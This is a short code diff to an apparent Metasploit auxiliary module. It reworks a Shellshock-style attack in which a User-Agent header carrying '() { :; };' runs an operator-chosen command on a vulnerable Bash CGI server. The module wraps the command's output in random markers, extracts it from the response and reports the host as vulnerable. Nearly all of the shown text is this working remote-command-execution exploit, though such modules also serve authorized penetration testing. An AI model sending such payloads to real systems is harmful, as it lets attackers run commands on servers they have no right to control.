@@ -41,14 +41,22 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def run_host(ip)
+    marker = Rex::Text.rand_text_alphanumeric(rand(42) + 1)
+
     res = send_request_raw(
       'method' => datastore['METHOD'],
       'uri' => normalize_uri(target_uri.path),
-      'agent' => "() { :;}; #{datastore['CMD']}"
+      'agent' => %Q{() { :; }; echo "#{marker}$(#{datastore['CMD']})#{marker}"}
     )
 
-    if res && res.code == 200
-      vprint_good("#{peer} - #{res.body}")
+    if res && res.body =~ /#{marker}(.+)#{marker}/m
+      print_good("#{peer} - #{$1}")
+      report_vuln(
+        :host => ip,
+        :port => rport,
+        :name => self.name,
+        :refs => self.references
+      )
     end
   end
 
